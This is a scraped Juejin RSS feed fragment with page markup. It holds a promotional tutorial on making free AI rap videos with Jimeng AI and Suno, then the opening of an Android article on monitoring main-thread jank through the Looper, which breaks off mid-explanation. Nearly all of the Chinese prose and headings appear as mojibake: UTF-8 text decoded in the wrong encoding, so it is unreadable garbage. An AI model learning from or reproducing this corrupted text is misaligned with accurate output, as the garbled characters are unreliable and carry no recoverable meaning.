table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä¸ç”¨èŠ±é’±ï¼Œä¸ç”¨æŠ€æœ¯ï¼Œå°ç™½ä¹Ÿèƒ½è½»æ¾æå®š</p>
</blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ç£Šå“¥ï¼ä»Šå¤©ç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªè¶…çº§å®ç”¨çš„å¹²è´§â€”â€”<strong>å¦‚ä½•å…è´¹åˆ¶ä½œAIè¯´å”±è§†é¢‘</strong>ï¼</p>
<p>å…ˆæ¥çœ‹çœ‹æ•ˆæœï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1JVUCBVEsL%2F" target="_blank" title="https://www.bilibili.com/video/BV1JVUCBVEsL/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1JVâ€¦</a></p>
<p>æ˜¯ä¸æ˜¯å¾ˆæœ‰æ„æ€ï¼Ÿè€Œä¸”<strong>è¿™ä¸€åˆ‡éƒ½æ˜¯AIè‡ªåŠ¨ç”Ÿæˆçš„</strong>ï¼Œæ“ä½œç®€å•åˆ°è®©ä½ ä¸æ•¢ç›¸ä¿¡ï¼</p>
<h2 data-id="heading-0">ğŸ’¡ ä¸ºä»€ä¹ˆè¿™ä¸ªç©æ³•èƒ½ç«ï¼Ÿ</h2>
<ul>
<li><strong>åå·®æ„Ÿå¼º</strong>ï¼šå¤ä»£äººç‰©å”±ç°ä»£è¯´å”±ã€‚</li>
<li><strong>è¶£å‘³æ€§è¶³</strong>ï¼šæç¬‘æ­Œè¯+å¯¹å£å‹è¡¨æ¼”ã€‚</li>
<li><strong>åˆ¶ä½œç®€å•</strong>ï¼š3æ­¥æå®šï¼Œå…¨ç¨‹å…è´¹ã€‚</li>
<li><strong>ä¼ æ’­æ€§å¼º</strong>ï¼š30ç§’çŸ­è§†é¢‘ï¼Œé€‚åˆå„å¤§å¹³å°ã€‚</li>
</ul>
<h2 data-id="heading-1">ğŸš€ ä¸‰æ­¥åˆ¶ä½œæ•™ç¨‹ï¼ˆå…¨ç¨‹å…è´¹ï¼‰</h2>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆäººç‰©å›¾ç‰‡</h3>
<p><strong>å·¥å…·</strong>ï¼šå³æ¢¦AI</p>
<p><strong>æ“ä½œ</strong>ï¼š</p>
<ul>
<li>æ‰“å¼€å³æ¢¦AIï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fjimeng.jianying.com%2F%25EF%25BC%2589%25EF%25BC%258C%25E8%25BF%259B%25E5%2585%25A5%2522%25E7%2594%259F%25E5%259B%25BE%2522%25E5%258A%259F%25E8%2583%25BD" target="_blank" title="https://jimeng.jianying.com/%EF%BC%89%EF%BC%8C%E8%BF%9B%E5%85%A5%22%E7%94%9F%E5%9B%BE%22%E5%8A%9F%E8%83%BD" ref="nofollow noopener noreferrer">jimeng.jianying.com/ï¼‰ï¼Œè¿›å…¥"ç”Ÿå›¾"åŠŸèƒ½</a></li>
<li>è¾“å…¥ä½ æƒ³è¦çš„äººç‰©æè¿°</li>
<li><strong>æŠ€å·§</strong>ï¼šå°½é‡åˆ¶é€ åå·®ï¼Œæ¯”å¦‚å¤ä»£äººç‰©ç°ä»£è£…æ‰®ã€‚</li>
<li><strong>æˆæœ¬</strong>ï¼šæ¯å¤©å…è´¹80ç§¯åˆ†ï¼Œç”Ÿæˆå›¾ç‰‡åªéœ€5-10ç§¯åˆ†ã€‚</li>
</ul>
<blockquote>
<p>æç¤ºè¯ï¼šç”Ÿæˆè®¸ä»™åŒ–å¸¦å¢¨é•œæ‹¿è¯ç­’å”±æ­Œçš„ç…§ç‰‡ï¼Œå¤ä»£å’Œç°ä»£çš„èåˆä¸åå·®ï¼Œç©¿å¤ä»£ç»¿ç™½è‰²è¡£æœï¼Œå¸¦ä¸€ä¸ªå¤ä»£ä¹¦ç”Ÿå¸½ã€‚</p>
</blockquote>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šç”Ÿæˆè¯´å”±éŸ³ä¹</h3>
<p><strong>å·¥å…·</strong>ï¼šSunoï¼ˆåŸsercomï¼‰</p>
<p><strong>æ“ä½œ</strong>ï¼š</p>
<ul>
<li>è®¿é—®ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.suno.com%2F%25EF%25BC%2588%25E9%259C%2580%25E9%25AD%2594%25E6%25B3%2595%25EF%25BC%2589%25E6%25B3%25A8%25E5%2586%258C%25E8%25B4%25A6%25E5%258F%25B7%25EF%25BC%2588%25E9%2582%25AE%25E7%25AE%25B1%25E5%258D%25B3%25E5%258F%25AF%25EF%25BC%2589" target="_blank" title="https://www.suno.com/%EF%BC%88%E9%9C%80%E9%AD%94%E6%B3%95%EF%BC%89%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%EF%BC%88%E9%82%AE%E7%AE%B1%E5%8D%B3%E5%8F%AF%EF%BC%89" ref="nofollow noopener noreferrer">www.suno.com/ï¼ˆéœ€é­”æ³•ï¼‰æ³¨å†Œè´¦å·ï¼ˆé‚®â€¦</a></li>
<li>è¿›å…¥åˆ›ä½œé¡µé¢ï¼Œè¾“å…¥æç¤ºè¯</li>
<li><strong>ç¤ºä¾‹æç¤ºè¯</strong>ï¼š"ç”Ÿæˆä¸€é¦–è®¸ä»™çš„æç¬‘æ­Œæ›²ï¼Œåªè¦é«˜æ½®éƒ¨åˆ†ï¼Œæ—¶é•¿30ç§’ä»¥å†…"</li>
<li>ç³»ç»Ÿä¼šç”Ÿæˆ4ä¸ªç‰ˆæœ¬ï¼Œé€‰æ‹©æœ€æ»¡æ„çš„ä¸‹è½½ã€‚</li>
<li><strong>æˆæœ¬</strong>ï¼šæ¯å¤©å…è´¹50ç§¯åˆ†ï¼Œæ¯é¦–æ­Œ10ç§¯åˆ†ã€‚</li>
</ul>
<h3 data-id="heading-4">ç¬¬ä¸‰æ­¥ï¼šåˆæˆå¯¹å£å‹è§†é¢‘</h3>
<p><strong>å·¥å…·</strong>ï¼šå³æ¢¦AIæ•°å­—äººåŠŸèƒ½ã€‚</p>
<p><strong>æ“ä½œ</strong>ï¼š</p>
<ul>
<li>å›åˆ°å³æ¢¦AIï¼Œæ‰¾åˆ°"æ•°å­—äºº"åŠŸèƒ½ã€‚</li>
<li>ä¸Šä¼ åˆšæ‰ç”Ÿæˆçš„å›¾ç‰‡å’ŒéŸ³é¢‘ã€‚</li>
<li>ç‚¹å‡»ç”Ÿæˆï¼Œç­‰å¾…2-3åˆ†é’Ÿã€‚</li>
<li><strong>æˆæœ¬</strong>ï¼šæ¯æ¬¡20ç§¯åˆ†ã€‚</li>
</ul>
<h2 data-id="heading-5">ğŸ’° å…è´¹é¢åº¦å®Œå…¨å¤Ÿç”¨</h2>
<ul>
<li><strong>å³æ¢¦AI</strong>ï¼šæ¯å¤©80ç§¯åˆ†ã€‚
<ul>
<li>ç”Ÿæˆå›¾ç‰‡ï¼š5-10ç§¯åˆ†ã€‚</li>
<li>æ•°å­—äººåˆæˆï¼š20ç§¯åˆ†ã€‚</li>
</ul>
</li>
<li><strong>SunoéŸ³ä¹</strong>ï¼šæ¯å¤©50ç§¯åˆ†ã€‚
<ul>
<li>æ¯é¦–æ­Œï¼š10ç§¯åˆ†ã€‚</li>
</ul>
</li>
</ul>
<p><strong>ç®—ä¸€ç®—</strong>ï¼šæ¯å¤©å¯ä»¥å…è´¹åˆ¶ä½œ5ä¸ªå®Œæ•´çš„è¯´å”±è§†é¢‘ï¼</p>
<h2 data-id="heading-6">ğŸ¯ åˆ¶ä½œå°è´´å£«</h2>
<ol>
<li><strong>é€‰é¢˜è¦æ–°é¢–</strong>ï¼šå¤ä»£äººç‰©+ç°ä»£å…ƒç´ åå·®æœ€å—æ¬¢è¿</li>
<li><strong>æ­Œè¯è¦æç¬‘</strong>ï¼šè½»æ¾å¹½é»˜çš„å†…å®¹æ›´å®¹æ˜“ä¼ æ’­</li>
<li><strong>æ—¶é•¿è¦æ§åˆ¶</strong>ï¼š30ç§’ä»¥å†…æœ€é€‚åˆçŸ­è§†é¢‘å¹³å°</li>
<li><strong>å£å‹è¦å¯¹å‡†</strong>ï¼šAIä¼šè‡ªåŠ¨å¯¹å£å‹ï¼Œæ•ˆæœå¾ˆè‡ªç„¶</li>
</ol>
<h2 data-id="heading-7">ğŸ’¥ ä¸ºä»€ä¹ˆç°åœ¨å°±è¦å¼€å§‹ï¼Ÿ</h2>
<ul>
<li><strong>çº¢åˆ©æœŸ</strong>ï¼šAIè§†é¢‘åˆ¶ä½œåˆšåˆšå…´èµ·ï¼Œç«äº‰å°ã€‚</li>
<li><strong>æˆæœ¬ä½</strong>ï¼šå®Œå…¨å…è´¹ï¼Œé›¶é—¨æ§›ã€‚</li>
<li><strong>æ•ˆæœå¥½</strong>ï¼šå¯¹å£å‹è‡ªç„¶ï¼Œåˆ¶ä½œç²¾è‰¯ã€‚</li>
<li><strong>å˜ç°å¿«</strong>ï¼šé€‚åˆæŠ–éŸ³ã€å¿«æ‰‹ã€è§†é¢‘å·ç­‰å¤šä¸ªå¹³å°ã€‚</li>
</ul>
<h2 data-id="heading-8">ğŸ‰ è¡ŒåŠ¨èµ·æ¥ï¼</h2>
<p>ä¸è¦å†è§‚æœ›äº†ï¼è¶ç€ç°åœ¨è¿˜æ˜¯çº¢åˆ©æœŸï¼Œèµ¶ç´§åŠ¨æ‰‹åˆ¶ä½œä½ çš„ç¬¬ä¸€ä¸ªAIè¯´å”±è§†é¢‘å§ï¼</p>
<p>è®°ä½ï¼š<strong>åˆ›æ„+åå·®+å…è´¹å·¥å…·=çˆ†æ¬¾è§†é¢‘</strong></p>
<p>æˆ‘æ˜¯ç£Šå“¥ï¼Œæ¯å¤©åˆ†äº«ä¸€ä¸ªå®ç”¨å¹²è´§ã€‚å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œè®°å¾—ç‚¹èµæ”¶è—ï¼Œæˆ‘ä»¬ä¸‹æœŸå†è§ï¼</p>
<hr/>
<p><strong>ç«‹å³è¡ŒåŠ¨</strong>ï¼š</p>
<ul>
<li>ä¸‹è½½å³æ¢¦AI</li>
<li>æ³¨å†ŒSunoè´¦å·</li>
<li>ä»Šå¤©å°±å¼€å§‹åˆ¶ä½œä½ çš„ç¬¬ä¸€ä¸ªAIè¯´å”±è§†é¢‘ï¼</li>
</ul>
<blockquote>
<p>æœºä¼šæ°¸è¿œç•™ç»™è¡ŒåŠ¨çš„äººï¼Œç°åœ¨å°±å¼€å§‹å§ï¼</p>
</blockquote>
<blockquote>
<p>æœ¬æ–‡å·²æ”¶å½•åˆ°æˆ‘çš„æŠ€æœ¯å°ç«™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.javacn.site" target="_blank" title="https://www.javacn.site" ref="nofollow noopener noreferrer">www.javacn.site</a>ï¼Œå…¶ä¸­åŒ…å«çš„å†…å®¹æœ‰ï¼šSpring AIã€Spring AI Alibabaã€LangChain4jã€Difyã€Cozeã€N8Nã€æ™ºèƒ½ä½“ï¼ˆAI Agentï¼‰ã€MCPã€Function Callã€RAGã€å‘é‡æ•°æ®åº“ã€Promptã€å¤šæ¨¡æ€ã€å‘é‡æ•°æ®åº“ã€åµŒå…¥æ¨¡å‹ã€AI å¸¸è§é¢è¯•é—®é¢˜ç­‰å†…å®¹ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•é€šè¿‡ Android æ¶ˆæ¯æœºåˆ¶å®ç° Looper çš„æ€§èƒ½ç›‘æ§]]></title>    <link>https://juejin.cn/post/7576155969604878371</link>    <guid>https://juejin.cn/post/7576155969604878371</guid>    <pubDate>2025-11-24T15:01:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576155969604878371" data-draft-id="7576105458807357440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•é€šè¿‡ Android æ¶ˆæ¯æœºåˆ¶å®ç° Looper çš„æ€§èƒ½ç›‘æ§"/> <meta itemprop="keywords" content="Android,æ€§èƒ½ä¼˜åŒ–,APP"/> <meta itemprop="datePublished" content="2025-11-24T15:01:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="apigfly"/> <meta itemprop="url" content="https://juejin.cn/user/2488950054453613"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•é€šè¿‡ Android æ¶ˆæ¯æœºåˆ¶å®ç° Looper çš„æ€§èƒ½ç›‘æ§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2488950054453613/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    apigfly
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T15:01:22.000Z" title="Mon Nov 24 2025 15:01:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>AGI çš„æ—¶ä»£çœŸçš„æ˜¯å¤ªæ£’å•¦ï½</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ Android å¼€å‘ä¸­ï¼Œ<code>Handler</code>ã€<code>Looper</code>ã€<code>MessageQueue</code> æ„æˆäº†æ•´ä¸ªåº”ç”¨æ¶ˆæ¯æœºåˆ¶çš„æ ¸å¿ƒã€‚è€Œä¸»çº¿ç¨‹æ‰§è¡Œè€—æ—¶ä»»åŠ¡æ˜¯ Android æƒ³è¦æåŠ›é¿å…çš„ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¼šåŸºäºæ¶ˆæ¯æœºåˆ¶ï¼Œ<strong>é€šè¿‡æ¥ç®¡ä¸»çº¿ç¨‹ Loop å¾ªç¯æ¥æ— ä¾µå…¥åœ°ç›‘æ§ UI å¡é¡¿</strong></p>
<p>é¦–å…ˆç®€å•ä»‹ç»æ¶ˆæ¯æœºåˆ¶çš„è®¾è®¡ï¼Œå¦‚æœéœ€è¦è¯¦ç»†çš„æºç åˆ†æï¼Œå¯ä»¥çœ‹ä¹‹å‰çš„æ–‡ç«  <a href="https://juejin.cn/post/6876710885801492487" target="_blank" title="https://juejin.cn/post/6876710885801492487">ä¼ é€é—¨</a></p>
<h2 data-id="heading-1">åŸç†</h2>
<p>Android çš„æ¶ˆæ¯æœºåˆ¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹</p>
<ul>
<li><code>Handler</code>: æ¶ˆæ¯çš„ç”Ÿäº§è€…ï¼ˆå‘é€ï¼‰ä¸æœ€ç»ˆæ¶ˆè´¹è€…ï¼ˆå¤„ç†ï¼‰</li>
<li><code>MessageQueue</code>: æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆç¼“å†²åŒºï¼‰ï¼Œå†…éƒ¨ä½¿ç”¨å•é“¾è¡¨ç»“æ„ç»´æŠ¤æ¶ˆæ¯ï¼ŒæŒ‰æ‰§è¡Œæ—¶é—´æ’åºã€‚</li>
<li><code>Looper</code>: åŠ¨åŠ›æ³µï¼Œä¸æ–­ä» <code>MessageQueue</code> ä¸­æŠ½å–æ¶ˆæ¯ã€‚</li>
<li><code>Message</code>: è½½ä½“ï¼ŒæŒæœ‰æ•°æ®å’Œå¤„ç†å®ƒçš„ <code>Handler</code> (target)ã€‚</li>
</ul>
<h3 data-id="heading-2">æ ¸å¿ƒç±»å›¾</h3>
<p>ä¸ºäº†ç†æ¸…å®ƒä»¬ä¹‹é—´çš„æŒæœ‰å…³ç³»ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ç±»å›¾ç»“æ„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5d8c0b34e584d96aa0194a33b77bf1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXBpZ2ZseQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764601282&amp;x-signature=yBEMDngZPqbjNirtN6EzzlRmyF0%3D" alt="image.png" loading="lazy"/></p>
<p>è¯´æ˜ï¼š</p>
<ul>
<li><code>Looper</code> ä¹Ÿå°±æ˜¯æ•´ä¸ªæ¶ˆæ¯æœºåˆ¶çš„â€œç®¡å®¶â€ï¼Œå®ƒæ‹¥æœ‰å”¯ä¸€çš„ <code>MessageQueue</code>ã€‚</li>
<li><code>Handler</code> å¿…é¡»ç»‘å®šåˆ°ä¸€ä¸ª <code>Looper</code> ä¸Šæ‰èƒ½å·¥ä½œã€‚</li>
<li><code>Message</code> å†…éƒ¨æŒæœ‰ <code>target</code> (å³ <code>Handler</code>)ï¼Œè¿™æ · <code>Looper</code> å–å‡ºæ¶ˆæ¯åï¼ŒçŸ¥é“è¯¥æŠŠå®ƒäº¤ç»™è°å»å¤„ç†ã€‚</li>
<li>ä¸€ä¸ªçº¿ç¨‹åªä¼šå¯¹åº”ä¸€ä¸ª <code>Looper</code> å¯¹è±¡</li>
</ul>
<h3 data-id="heading-3">æ¶ˆæ¯åˆ†å‘æ—¶åºå›¾</h3>
<p>å½“æˆ‘ä»¬åœ¨å­çº¿ç¨‹è°ƒç”¨ <code>handler.sendMessage()</code> æ—¶ï¼Œæ•´ä¸ªç³»ç»Ÿæ˜¯å¦‚ä½•è¿è½¬çš„ï¼Ÿ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/239ea61d185a47ed8d7e933304989a1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXBpZ2ZseQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764601282&amp;x-signature=AxcrYg6jjzVLucrifeHeKtQPIH0%3D" alt="image.png" loading="lazy"/></p>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li>å…¥é˜Ÿ (<code>enqueueMessage</code>)ï¼šçº¿ç¨‹å®‰å…¨çš„å°†æ¶ˆæ¯æ’å…¥å•é“¾è¡¨ã€‚</li>
<li>å‡ºé˜Ÿ (<code>next</code>)ï¼šè¿™æ˜¯ä¸€ä¸ªé˜»å¡æ“ä½œã€‚å¦‚æœé˜Ÿåˆ—ä¸ºç©ºæˆ–æ—¶é—´æœªåˆ°ï¼Œåˆ©ç”¨ Linux çš„ <code>epoll</code> æœºåˆ¶æŒ‚èµ·çº¿ç¨‹ï¼Œé‡Šæ”¾ CPU èµ„æºã€‚</li>
<li>åˆ†å‘ (<code>dispatchMessage</code>)ï¼š<code>Looper</code> æ‹¿åˆ°æ¶ˆæ¯åï¼Œç›´æ¥è°ƒç”¨ <code>msg.target</code> (å³ <code>Handler</code>) çš„æ–¹æ³•åœ¨å½“å‰çº¿ç¨‹æ‰§è¡Œã€‚</li>
</ul>
<blockquote>
<p>åŸºç¡€å†…å®¹ç»“æŸï¼Œæ¥ä¸‹æ¥å¼€å§‹æˆ‘ä»¬çš„å®æˆ˜</p>
</blockquote>
<h2 data-id="heading-4">å®æˆ˜</h2>
<p>åœ¨æ€§èƒ½ä¼˜åŒ–ä¸­ï¼Œç›‘æ§ä¸»çº¿ç¨‹å¡é¡¿ï¼ˆANRï¼‰æ˜¯é‡ä¸­ä¹‹é‡ã€‚ é€šå¸¸æˆ‘ä»¬ä½¿ç”¨ <code>Looper.getMainLooper().setMessageLogging(Printer)</code> æ¥ç›‘æ§ï¼Œä½†è¿™ç§æ–¹å¼ä¼šäº§ç”Ÿå¤§é‡çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¯¹æ€§èƒ½æœ‰å¾®å¼±å½±å“ã€‚</p>
<p>è¿™é‡Œä»‹ç»ä¸€ç§æ›´åº•å±‚ã€æ›´æ¿€è¿›çš„æ€è·¯ï¼š<code>Looper åŠ«æŒ</code></p>
<h3 data-id="heading-5">æ ¸å¿ƒæ€è·¯</h3>
<p>Android ä¸»çº¿ç¨‹æœ¬è´¨ä¸Šå°±æ˜¯åœ¨ä¸€ä¸ªæ­»å¾ªç¯ä¸­è¿è¡Œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åŸç”Ÿ ActivityThread é€»è¾‘ç®€åŒ–</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    Looper.prepareMainLooper();
    <span class="hljs-comment">// ...</span>
    Looper.loop(); <span class="hljs-comment">// &lt;--- æ­»å¾ªç¯ï¼Œè¿™é‡Œå¦‚æœä¸é€€å‡ºï¼ŒAPP å°±åœ¨è¿è¡Œä¸­</span>
}
</code></pre>
<p><strong>å¦‚æœæˆ‘ä»¬å‘ä¸»çº¿ç¨‹å‘é€ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¿™ä¸ªæ¶ˆæ¯çš„ <code>Runnable</code> å†…éƒ¨ä¹Ÿæ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</strong><br/>
